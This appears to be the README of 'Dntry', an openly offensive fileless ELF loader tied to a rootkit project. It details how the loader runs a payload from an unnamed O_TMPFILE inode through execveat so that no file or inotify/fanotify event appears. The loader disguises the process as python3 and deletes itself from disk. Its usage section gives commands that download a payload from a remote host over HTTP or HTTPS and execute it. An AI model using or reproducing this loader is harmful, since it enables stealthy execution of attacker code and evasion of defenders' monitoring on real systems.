# Dntry

<img src="https://i.imgur.com/O15awdJ.png" alt="Singularity Rootkit" width="600"/>

Fileless ELF execution via `O_TMPFILE` + `execveat(AT_EMPTY_PATH)`.

Allocates an anonymous inode on a real filesystem using `O_TMPFILE`, writes the payload into it, and executes through `execveat` with `AT_EMPTY_PATH`. No directory entry is ever created. The VFS never emits an `inotify` or `fanotify` event. The running process appears as `/tmp/#N (deleted)` in telemetry. No `memfd_create`, no `/dev/shm`, no named file at any point in the chain.

The loader unlinks itself from disk before exec. Nothing survives on disk once the payload takes over.

- https://discord.gg/rootkits

## Requirements

| | |
|---|---|
| Kernel | 3.11+ (`O_TMPFILE` support) |
| Compiler | gcc |
| Build tools | make |
| HTTPS (optional) | libssl-dev |

```sh
# Debian/Ubuntu/Kali
sudo apt install gcc make

# HTTPS support
sudo apt install libssl-dev
```

## Build

```sh
# static binary, HTTP only
make

# with HTTPS support
make https

# demo payload
make demo
```

## Usage

```sh
# from stdin
cat payload.elf | ./dntry stdin python3

# from HTTP
./dntry http http://192.168.1.10:8080/payload python3

# from HTTPS
./dntry http https://192.168.1.10/payload python3

# from local file
./dntry file ./payload.elf python3
```

The third argument becomes `argv[0]` of the exec'd process. Additional arguments are passed through.

## Example

```
process.name:       python3
process.executable: /tmp/#220 (deleted)
```

## How it works

1. `open("/tmp", O_TMPFILE|O_RDWR, 0700)` allocates an anonymous inode with no directory entry
2. Payload bytes are written into the fd
3. The fd is reopened read-only to clear the write flag (`ETXTBSY`)
4. `prctl(PR_SET_NAME)` renames the thread before exec
5. The loader unlinks itself via `/proc/self/exe`
6. `execveat(fd, "", argv, envp, AT_EMPTY_PATH)` executes the fd directly, no path string ever constructed
